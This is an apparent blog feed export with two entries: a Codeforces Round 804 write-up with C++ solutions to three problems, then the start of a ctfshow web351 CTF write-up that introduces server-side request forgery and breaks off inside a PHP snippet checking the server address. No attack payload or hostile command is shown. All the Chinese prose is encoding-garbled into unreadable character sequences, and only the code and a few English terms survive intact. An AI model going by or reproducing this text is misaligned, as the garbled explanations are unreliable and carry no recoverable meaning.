    <content type="html"><![CDATA[<p>å¥½ä¹…æ²¡æ‰“è¿‡cfäº†ï¼Œä»Šå¤©é‡æ¸©ä¸€ä¸‹ï¼Œå¯èƒ½æ‰‹æ¯”è¾ƒç”Ÿäº†ï¼Œæ‰“å¾—çŠ¶æ€ä¸å¤ªå¥½ã€‚å®æ—¶<a href="https://www.bilibili.com/video/BV1xB4y1W79t/">å½•å±</a></p><span id="more"></span><h2 id="A-The-Third-Three-Number-Problem"><a href="#A-The-Third-Three-Number-Problem" class="headerlink" title="A. The Third Three Number Problem"></a>A. The Third Three Number Problem</h2><h3 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/1.png" alt="1"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>é¢˜æ„æ¯”è¾ƒç®€å•ï¼Œç»™å®šä¸€ä¸ªæ•°ï¼Œæ„é€ ä¸‰ä¸ªæ•°ä½¿å¾— <code>a^b+b^c+c^a==n</code>ã€‚é¦–å…ˆä¸éš¾æƒ³åˆ°ï¼Œå¥‡æ•°ä¸€å®šæ— æ³•æ„é€ ï¼Œå› ä¸ºå¥‡æ•°å¼‚æˆ–å¶æ•°ç»“æœä¸€å®šä¸ºå¥‡æ•°ï¼Œå¥‡æ•°ä¸å¥‡æ•°ä»¥åŠå¶æ•°ä¸å¶æ•°å¼‚æˆ–ç»“æœä¸€å®šä¸ºå¶æ•°ï¼Œåˆ™æˆ‘ä»¬æœ‰ä»¥ä¸‹ç»“è®ºï¼š</p><ul><li>è‹¥ä¸‰ä¸ªæ•°ä¸­æ²¡æœ‰å¥‡æ•°ï¼Œåˆ™ç›¸äº’å¼‚æˆ–å’Œä¸€å®šä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°ä¸­åªæœ‰ä¸€ä¸ªå¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœä¼šäº§ç”Ÿ2ä¸ªå¥‡æ•°ï¼Œä¸€ä¸ªå¶æ•°ï¼Œæœ€ç»ˆå’Œä»ä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°ä¸­æœ‰ä¸¤ä¸ªå¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœäº§ç”Ÿ2ä¸ªå¥‡æ•°ï¼Œä¸€ä¸ªå¶æ•°ï¼Œæœ€ç»ˆå’Œä¹Ÿä¸ºå¶æ•°ã€‚</li><li>è‹¥ä¸‰ä¸ªæ•°å…¨æ˜¯å¥‡æ•°ï¼Œåˆ™å¼‚æˆ–çš„ç»“æœäº§ç”Ÿå…¨ä¸ºå¶æ•°ï¼Œæœ€ç»ˆç»“æœä¹Ÿæ˜¯å¶æ•°ã€‚</li></ul><p>ä¸éš¾å‘ç°æˆ‘ä»¬æœ€ç»ˆç»“æœå¿…æ˜¯å¶æ•°ã€‚</p><p>é‚£ä¹ˆå¦‚æœä¸æ˜¯å¶æ•°é‚£ä¹ˆç›´æ¥è¾“å‡º-1ï¼Œè‹¥æ˜¯åˆ™æˆ‘ä»¬ä»¤å…¶ä¸­ä¸¤ä¸ªæ•°ä¸º1ï¼Œé‚£ä¹ˆæœ€ç»ˆç»“æœå°±æ˜¯ <code>n=1^1+1^x+1^x=2*(1^x)</code>ã€‚æˆ‘ä»¬éå¸¸å®¹æ˜“èƒ½è§£å‡º <code>x</code> çš„å€¼ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn],b[maxn];</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1 1 %d\n&quot;</span>,(n/<span class="number">2</span>)^<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Bit-Flipping"><a href="#B-Bit-Flipping" class="headerlink" title="B. Bit Flipping"></a>B. Bit Flipping</h2><h3 id="é¢˜ç›®æè¿°ï¼š-1"><a href="#é¢˜ç›®æè¿°ï¼š-1" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/2.png" alt="2"></p><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯è¯´ï¼Œæ„é€ ä¸€ä¸ªç»™å®šé•¿åº¦çš„çŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸ªæ ¼å­å€¼ä¸º0æˆ–è€…1ï¼Œè¦æ±‚å¯¹äºæ¯ä¸€ä¸ªæ ¼å­ï¼Œéƒ½æœ‰ä¸¤ä¸ªç›¸é‚»çš„ä¸ä¹‹é¢œè‰²ä¸ä¸€æ ·çš„æ ¼å­ï¼Œå¹¶ä¸”åªèƒ½æœ‰ä¸¤ä¸ªã€‚</p><p>å¤§éƒ¨åˆ†åŒå­¦å¯èƒ½æ‰¾è§„å¾‹ï¼Œä½†æ˜¯æˆ‘åé¢æƒ³åˆ°äº†ä¸€ä¸ªé€’æ¨çš„æ–¹å¼ï¼Œä»å°çš„çŸ©é˜µæ‰©å±•ã€‚å› ä¸ºå·²æœ‰çš„çŸ©é˜µå¿…ç„¶æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œå› æ­¤å¦‚æœå¯¹çŸ©é˜µè¿›è¡Œæ‰©å±•ï¼Œé‚£ä¹ˆæ‰©å±•çš„ä¸€åˆ—å¿…é¡»å’Œè¢«æ‰©å±•çš„é‚£ä¸€åˆ—å€¼ä¸€æ¨¡ä¸€æ ·ï¼Œç”±äºå®½é«˜éƒ½ä¸ºå¶æ•°ï¼Œå› æ­¤æˆ‘ä»¬å†æ¬¡æ‰©å……çš„ä¸€åˆ—å¿…é¡»ä¸è¢«æ‰©å±•åˆ—å®Œå…¨ç›¸åã€‚å¦‚æ­¤ä¸€æ¥è¾¾åˆ°äº†æˆ‘ä»¬æ‰€æ„é€ çš„ç›®æ ‡ï¼Œæˆ‘ä»¬æœ€ç»ˆæ„é€ çš„å›¾å½¢ä¸º</p><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/3.png" alt="3"></p><p>åˆå§‹åŒ–ä¹‹åï¼Œæ ¹æ®é•¿å®½è¾“å‡ºå°±å¯ä»¥äº†ã€‚</p><h3 id="æ ‡ç¨‹-1"><a href="#æ ‡ç¨‹-1" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 52</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,a[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<span class="comment">//ÃÃÃÃ </span></span><br><span class="line">    <span class="comment">//memset(a,-1,sizeof(a));</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(n,m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">    a[<span class="number">1</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">2</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=!a[i<span class="number">-1</span>][j];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i<span class="number">-1</span>][j+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">50</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">3</span>;j&lt;=<span class="number">50</span>;j+=<span class="number">2</span>)&#123;</span><br><span class="line">            a[i][j]=a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j]=a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">            a[i][j+<span class="number">1</span>]=!a[i][j<span class="number">-1</span>];</span><br><span class="line">            a[i+<span class="number">1</span>][j+<span class="number">1</span>]=!a[i+<span class="number">1</span>][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Line-Empire"><a href="#C-Line-Empire" class="headerlink" title="C. Line Empire"></a>C. Line Empire</h2><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="/2022/07/05/Codeforces%20Round%20804(Div.2)/4.png" alt="4"></p><h3 id="é¢˜ç›®åˆ†æ-2"><a href="#é¢˜ç›®åˆ†æ-2" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>è¿™ä¸ªé¢˜ç›®çš„æ„æ€æ˜¯ï¼Œæ±‚ç¬¦åˆæ¡ä»¶çš„æ’åˆ—æ•°é‡ï¼Œè¦æ±‚ä»»æ„å­åŒºé—´å†…ï¼Œæ»¡è¶³æœªå‡ºç°è¿‡çš„æœ€å°å€¼ç›¸åŒï¼Œæ±‚æ’åˆ—æ•°ã€‚å…ˆè€ƒè™‘ä¸€ä¸ªé—®é¢˜ï¼Œé¦–å…ˆ0çš„ä½ç½®ä¸€å®šè¦ç›¸ç­‰ï¼Œå› ä¸ºæ²¡æœ‰åŒ…æ‹¬0ï¼Œé‚£ä¹ˆç»“æœä¸€å®šä¸º0ï¼ŒåŒ…æ‹¬äº†0ï¼Œç»“æœä¸€å®šä¸ä¸º0ã€‚é‚£ä¹ˆå†è€ƒè™‘1ï¼Œè‹¥åŒºé—´åŒæ—¶åŒ…æ‹¬0å’Œ1ï¼Œé‚£ä¹ˆç»“æœä¸€å®šä¸ä¸º1ï¼Œå› æ­¤1çš„ä½ç½®ä¹Ÿå¿…é¡»ç›¸åŒã€‚é‚£ä¹ˆå†è€ƒè™‘2ï¼ŒåŒæ ·ï¼ŒåŒºé—´éœ€è¦åŒ…æ‹¬0ï¼Œ1ï¼Œ2æ—¶ï¼Œç»“æœæ‰ä¸ä¸º2åŠä»¥ä¸‹çš„å€¼ï¼Œä½†æ˜¯è¿™ä¸ªæ—¶å€™å°±æœ‰ä¸¤ç§æƒ…å†µï¼Œ2åœ¨0å’Œ1ä¹‹é—´æˆ–è€…2ä¸åœ¨0å’Œ1ä¹‹é—´ã€‚è‹¥åœ¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨0~1çš„ä½ç½®å†…ä»»æ„æ”¾ç½®2ï¼Œå› ä¸ºæˆ‘ä»¬è‹¥æƒ³åŒæ—¶åŒ…æ‹¬0å’Œ1ï¼Œåˆ™å¿…é¡»åŒ…æ‹¬2ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œ2å°±å¯ä»¥åœ¨åŒºé—´å†…ä»»æ„ä½ç½®ï¼Œå¯¹æ–¹æ¡ˆæ•°åšå‡ºè´¡çŒ®ã€‚å¦‚æœä¸åœ¨ï¼Œé‚£ä¹ˆ2åŒæ ·ä¹Ÿåªèƒ½å›ºå®šä½ç½®ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªåŒºé—´ï¼Œè‹¥æ•°åœ¨åŒºé—´å¤–ï¼Œåˆ™æ‰©å±•åŒºé—´ï¼Œè‹¥åœ¨åŒºé—´å†…ï¼Œåˆ™åŒºé—´å†…å‰©ä½™çš„ä½ç½®éƒ½å¯ä»¥æ”¾ç½®ã€‚</p><h3 id="æ ‡ç¨‹-2"><a href="#æ ‡ç¨‹-2" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;m);</span><br><span class="line">        a[m]=i;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">int</span> l=a[<span class="number">0</span>],r=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> range=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">bool</span> flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;r)&#123;</span><br><span class="line">            r=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;l)&#123;</span><br><span class="line">            l=a[i];</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        range=r-l;</span><br><span class="line">        <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">            ans*=(range-i+<span class="number">1</span>);</span><br><span class="line">            ans%=mod;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å•¥ä¹Ÿä¸è¯´äº†ï¼ŒçŒ›ç»ƒå§ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¥½ä¹…æ²¡æ‰“è¿‡cfäº†ï¼Œä»Šå¤©é‡æ¸©ä¸€ä¸‹ï¼Œå¯èƒ½æ‰‹æ¯”è¾ƒç”Ÿäº†ï¼Œæ‰“å¾—çŠ¶æ€ä¸å¤ªå¥½ã€‚å®æ—¶&lt;a href=&quot;https://www.bilibili.com/video/BV1xB4y1W79t/&quot;&gt;å½•å±&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshowåˆ·é¢˜è®°å½•-web351</title>
    <link href="http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/"/>
    <id>http://example.com/2022/06/16/ctfshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-web351/</id>
    <published>2022-06-16T15:00:00.000Z</published>
    <updated>2022-06-17T12:23:01.523Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©å­¦å­¦ <code>ssrf</code>ï¼Œæœ‰äº›æœåŠ¡å™¨çš„æŸäº›èµ„æºå¯èƒ½ä¼šè§„å®šè¯·æ±‚å¿…é¡»æ¥è‡ªå†…ç½‘æ‰èƒ½è®¿é—®èµ„æºï¼Œå¦‚æœä¸æ˜¯å†…ç½‘ç”¨æˆ·åˆ™ä¼šè¢«æ‹’ï¼Œè€Œ <code>ssrf</code> å°±èƒ½ä¸ºæˆ‘ä»¬æä¾›ä¸€ä¸ªå†…ç½‘è®¿é—®çš„é€šé“ã€‚</p><span id="more"></span><h2 id="æµ…æssrf"><a href="#æµ…æssrf" class="headerlink" title="æµ…æssrf"></a>æµ…æssrf</h2><blockquote><p>åœ¨è®¡ç®—æœºå®‰å…¨ä¸­ï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆè‹±è¯­ï¼šServer-side Request Forgeryï¼Œç®€ç§°SSRFï¼‰æ˜¯æ”»å‡»è€…æ»¥ç”¨æœåŠ¡å™¨åŠŸèƒ½æ¥è®¿é—®æˆ–æ“ä½œæ— æ³•è¢«ç›´æ¥è®¿é—®çš„ä¿¡æ¯çš„æ–¹å¼ä¹‹ä¸€</p></blockquote><p>åœ¨ä¹‹å‰åšè¿‡çš„é¢˜ç›®ç§ï¼Œæˆ‘ä»¬å·²ç»åˆæ­¥æ¥è§¦è¿‡æœ¬åœ°ç½‘é¡µé™åˆ¶è®¿é—®èµ„æºçš„ä¾‹å­ï¼Œä½†æ˜¯æˆ‘ä»¬éƒ½å¯ä»¥ä¼ªé€ ï¼Œæ¯”å¦‚ <code>referer</code> å­—æ®µæˆ–è€…æ˜¯ <code>X-Forwarded-for</code> å­—æ®µï¼Œå› ä¸ºåŒ…å«åœ¨æˆ‘ä»¬è¯·æ±‚çš„ <code>headers</code> ä¸­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ªé€ ã€‚ä½†æ˜¯ <code>$_SERVER</code> å°±æ˜¯æˆ‘ä»¬æ‰€ä¸èƒ½ä¼ªé€ çš„äº†ï¼Œè¿™ä¸ªå˜é‡æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p><blockquote><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚ä¸èƒ½ä¿è¯æ¯ä¸ªæœåŠ¡å™¨éƒ½æä¾›å…¨éƒ¨é¡¹ç›®ï¼›æœåŠ¡å™¨å¯èƒ½ä¼šå¿½ç•¥ä¸€äº›ï¼Œæˆ–è€…æä¾›ä¸€äº›æ²¡æœ‰åœ¨è¿™é‡Œåˆ—ä¸¾å‡ºæ¥çš„é¡¹ç›®ã€‚è¿™ä¹Ÿå°±æ„å‘³ç€å¤§é‡çš„æ­¤ç±»å˜é‡éƒ½ä¼šåœ¨<a href="http://www.faqs.org/rfcs/rfc3875">Â» CGI 1.1 è§„èŒƒ</a>ä¸­è¯´æ˜ï¼Œæ‰€ä»¥åº”è¯¥ä»”ç»†ç ”ç©¶ä¸€ä¸‹ã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬å¯¹ <code>SERVER</code> å˜é‡è¿›è¡Œæ ¡éªŒå³å¯åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªæœ¬åœ°ï¼Œå¦‚æœä¸æ¥è‡ªæœ¬åœ°åˆ™ç›´æ¥æ‹’ç»æ‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_ADDR&#x27;</span>]!==<span 